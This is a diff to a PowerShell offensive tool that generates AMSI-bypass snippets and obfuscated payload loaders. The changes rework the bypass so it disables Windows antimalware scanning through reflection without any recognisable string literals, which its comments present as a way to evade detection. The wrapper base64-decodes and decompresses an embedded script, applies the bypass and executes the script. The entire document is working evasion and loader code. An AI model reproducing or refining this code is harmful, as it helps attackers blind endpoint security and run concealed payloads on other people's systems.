@@ -16,7 +16,9 @@ function Get-AmsiBypassSnippet {
 
     switch ($Technique) {
         'fail' {
-            return "try{[Ref].Assembly.GetType('Sys'+'tem.Management.Auto'+'mation.AmsiUt'+'ils').GetField('amsiIn'+'itFailed','NonPublic,Static').SetValue(`$null,`$true)}catch{}"
+            # Enumerate NonPublic,Static fields by type: bool->true (amsiInitFailed), IntPtr->zero (amsiContext).
+            # No field names or "AmsiUtils"/"amsiInitFailed" string literals appear anywhere.
+            return "try{`$_at=[Ref].Assembly.GetType([string]::new([char[]](83,121,115,116,101,109,46,77,97,110,97,103,101,109,101,110,116,46,65,117,116,111,109,97,116,105,111,110,46,65,109,115,105,85,116,105,108,115)));`$_at.GetFields([Reflection.BindingFlags]'NonPublic,Static')|%{if(`$_.FieldType-eq[bool]){`$_.SetValue(`$null,`$true)}elseif(`$_.FieldType-eq[IntPtr]){`$_.SetValue(`$null,[IntPtr]::Zero)}}}catch{}"
         }
 
         'direct' {
@@ -216,7 +218,7 @@ function New-PayloadScript {
     $gzs.Close()
     $b64 = [Convert]::ToBase64String($ms.ToArray())
 
-    $decomp = "`$$vGz='$b64';`$$vA=New-Object IO.MemoryStream(,[Convert]::FROmbAsE64StRiNg(`$$vGz));`$$vB=New-Object IO.Compression.GzipStream(`$$vA,[IO.Compression.CoMPressionMode]::deCOmPreSs);`$$vC=New-Object IO.MemoryStream;`$$vB.COpYTo(`$$vC);`$$vD=[Text.Encoding]::UTF8.GETSTrIng(`$$vC.ToArray());`$$vB.ClosE();`$$vA.ClosE();`$$vC.ClosE();try{`$_1=[System.Text.Encoding]::ASCII.GetString([byte[]](65,109,115,105,85,116,105,108,115));`$_2=[System.Text.Encoding]::ASCII.GetString([byte[]](97,109,115,105,73,110,105,116,70,97,105,108,101,100));[Ref].Assembly.GetType([string]::Concat('System.Management.Automation.',`$_1)).GetField(`$_2,'NonPublic,Static').SetValue(`$null,`$true)}catch{};[scriptblock]::Create(`$$vD).Invoke()"
+    $decomp = "`$$vGz='$b64';`$$vA=New-Object IO.MemoryStream(,[Convert]::FROmbAsE64StRiNg(`$$vGz));`$$vB=New-Object IO.Compression.GzipStream(`$$vA,[IO.Compression.CoMPressionMode]::deCOmPreSs);`$$vC=New-Object IO.MemoryStream;`$$vB.COpYTo(`$$vC);`$$vD=[Text.Encoding]::UTF8.GETSTrIng(`$$vC.ToArray());`$$vB.ClosE();`$$vA.ClosE();`$$vC.ClosE();try{`$_at=[Ref].Assembly.GetType([string]::new([char[]](83,121,115,116,101,109,46,77,97,110,97,103,101,109,101,110,116,46,65,117,116,111,109,97,116,105,111,110,46,65,109,115,105,85,116,105,108,115)));`$_at.GetFields([Reflection.BindingFlags]'NonPublic,Static')|%{if(`$_.FieldType-eq[bool]){`$_.SetValue(`$null,`$true)}elseif(`$_.FieldType-eq[IntPtr]){`$_.SetValue(`$null,[IntPtr]::Zero)}}}catch{};[scriptblock]::Create(`$$vD).Invoke()"
 
     return [PSCustomObject]@{
         InlinePS    = $decomp
